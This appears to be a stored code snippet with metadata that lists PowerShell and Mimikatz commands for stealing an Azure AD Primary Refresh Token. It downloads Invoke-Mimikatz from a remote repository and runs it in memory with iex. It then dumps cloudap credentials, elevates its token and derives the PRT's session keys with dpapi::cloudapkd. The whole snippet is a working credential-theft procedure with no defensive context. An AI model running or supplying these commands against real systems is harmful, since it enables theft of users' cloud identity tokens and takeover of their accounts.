---
id: d9e5045f-7057-4a09-aa2a-fa53ad50b78e
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:15.696477+00:00'
updated_at: '2023-05-25T05:46:38.501696+00:00'
---

# Code Snippet d9e5045f

**Language**: Powershell

```powershell
# Run mimikatz to obtain the PRT
PS> iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
PS> Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'

# Copy the PRT and KeyValue
Mimikatz> privilege::debug
Mimikatz> token::elevate
Mimikatz> dpapi::cloudapkd /keyvalue:<KeyValue> /unprotect

# Copy the Context, ClearKey and DerivedKey
Mimikatz> dpapi::cloudapkd /context:<Context> /derivedkey:<DerivedKey> /Prt:<PRT>
```
